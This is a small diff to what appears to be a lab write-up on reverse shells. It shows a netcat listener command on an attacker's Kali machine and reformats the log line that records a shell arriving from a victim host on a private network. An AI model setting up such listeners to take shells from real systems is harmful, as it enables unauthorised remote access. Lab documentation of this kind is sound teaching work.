@@ -30,7 +30,7 @@ On the Attacker machine (Kali):
 nc -lvnp 4444
 
 Successfully received incoming shell from Victim:
-connect to [192.168.0.11] from (192.168.0.12) 49280
+connect to [192.168.0.11] from [192.168.0.12]
 <details>
 <summary>🖼️ Session Connection</summary>
 
